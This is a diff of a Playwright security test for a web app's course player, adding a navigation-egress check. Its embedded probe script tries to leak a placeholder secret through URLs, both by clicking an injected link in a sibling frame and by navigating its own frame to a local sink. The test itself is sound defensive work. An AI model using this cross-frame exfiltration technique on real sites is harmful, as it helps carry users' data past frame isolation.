@@ -20,7 +20,10 @@
  *     player-origin document (final-critic FC6): it cannot frame the boot
  *     page, the boot script, the /training 404 or the worker's refusal
  *     (frame-ancestors), and the app's boot frame it CAN reach as a sibling
- *     sends nothing to a cross-origin sink (the boot page's header CSP).
+ *     sends nothing to a cross-origin sink (the boot page's header CSP);
+ *   - course content cannot navigate its own frame, or the boot frame through
+ *     its DOM, to another origin (the app shell's runtime frame-src policy,
+ *     ADR-0012 threat model item 6).
  *
  * The course script only records outcomes; it carries no payload beyond what
  * the assertions need. Run under web_ui/playwright.config.ts (vite preview of
@@ -34,6 +37,7 @@ const PROBE_PACK = 'isolation-probe-course';
 const CLICK_PACK = 'isolation-click-course';
 const OTHER_PACK = 'isolation-other-course';
 const ESCAPE_PACK = 'isolation-escape-course';
+const NAV_PACK = 'isolation-nav-egress-course';
 const SLIDE_DOC_PATH = 'docs/slide-001-5rN4PvXJM5d.json';
 const SLIDE_DOC = Buffer.from(
   JSON.stringify({ slide_id: '5rN4PvXJM5d', slide_title: 'Welcome', section_title: 'Launch Menu', on_screen_text: 'Start' }),
@@ -375,6 +379,74 @@ test('course content cannot escape its CSP through a same-origin player-origin d
   await expect(page.locator('iframe[data-testid="training-player-boot"]')).toHaveAttribute('sandbox', 'allow-scripts allow-same-origin');
   // Nothing reached the sink from any document.
   expect(hits, 'FC6 cross-origin egress from a same-origin player document').toEqual([]);
+});
+
+/**
+ * The navigation-egress course (ADR-0012 threat model item 6): CSP on a
+ * course document does not govern navigation, so the course tries to carry
+ * data out in a URL by (ii) inserting and clicking a link in the app's boot
+ * frame and then (i) navigating its own frame. The app shell's runtime
+ * `frame-src <player origin>` must refuse both before any request is sent.
+ * Each attempt is announced on the console so the row is not vacuous.
+ */
+function navEgressStoryHtml(): string {
+  const script = `
+(function () {
+  var appOrigin = (location.ancestorOrigins && location.ancestorOrigins[0]) || '';
+  var SINK = appOrigin + '/__nav-egress-sink/';
+  setTimeout(function () {
+    var boot = null;
+    for (var i = 0; i < window.parent.frames.length; i++) {
+      try { if (window.parent.frames[i].location.pathname === '/training-boot.html') boot = window.parent.frames[i]; } catch (e) { /* cross-origin */ }
+    }
+    console.log('NAV-EGRESS boot-frame ' + (boot ? 'found' : 'missing'));
+    if (boot) {
+      var a = boot.document.createElement('a');
+      a.href = SINK + 'boot-link?data=course-secret';
+      boot.document.body.appendChild(a);
+      a.click();
+      console.log('NAV-EGRESS boot-link clicked');
+    }
+    setTimeout(function () {
+      console.log('NAV-EGRESS self-navigation attempted');
+      location.href = SINK + 'self?data=course-secret';
+    }, 1000);
+  }, 1500);
+})();`;
+  return `<!doctype html><html><head><title>nav egress probe</title></head><body><pre id="nav-probe">running</pre><script>${script}</script></body></html>`;
+}
+
+test('a course cannot navigate its own frame or the boot frame off the player origin (navigation egress)', async ({ page }) => {
+  const logs: string[] = [];
+  page.on('console', (message) => {
+    if (message.text().startsWith('NAV-EGRESS')) logs.push(message.text());
+  });
+  await page.goto('/');
+  const appOrigin = new URL(page.url()).origin;
+  const hits: string[] = [];
+  await page.route(`${appOrigin}/__nav-egress-sink/**`, (route) => {
+    hits.push(route.request().url());
+    return route.fulfill({ status: 204 });
+  });
+  await page.getByRole('button', { name: 'Documents', exact: true }).click();
+  await expect(page.getByTestId('packs-panel')).toBeVisible({ timeout: 45_000 });
+  await install(page, await packZip(NAV_PACK, '1.0.0', { 'story.html': navEgressStoryHtml() }), 'nav.zip', NAV_PACK, '1.0.0');
+  await page.getByRole('button', { name: 'Training', exact: true }).click();
+  const option = page.getByTestId('training-pack-select').locator('option', { hasText: NAV_PACK });
+  await expect(option).toHaveCount(1, { timeout: 30_000 });
+  await page.getByTestId('training-pack-select').selectOption((await option.getAttribute('value')) ?? '');
+
+  await expect.poll(() => logs.includes('NAV-EGRESS self-navigation attempted'), { timeout: 60_000 }).toBe(true);
+  await page.waitForTimeout(2000);
+  // Non-vacuous: the course reached the boot frame and attempted both navigations.
+  expect(logs).toEqual(expect.arrayContaining(['NAV-EGRESS boot-frame found', 'NAV-EGRESS boot-link clicked', 'NAV-EGRESS self-navigation attempted']));
+  expect(hits, 'navigation egress from a player frame').toEqual([]);
+  expect(new URL(page.url()).origin).toBe(appOrigin);
+  // The control that refused them: the app shell's runtime frame policy for
+  // the resolved player origin.
+  const player = new URL(appOrigin);
+  player.hostname = player.hostname === '127.0.0.1' ? 'localhost' : '127.0.0.1';
+  await expect(page.locator('head meta[http-equiv="Content-Security-Policy"]')).toHaveAttribute('content', `frame-src ${player.origin}`);
 });
 
 test('a click inside the course frame cannot open a popup or navigate the top page', async ({ page }) => {
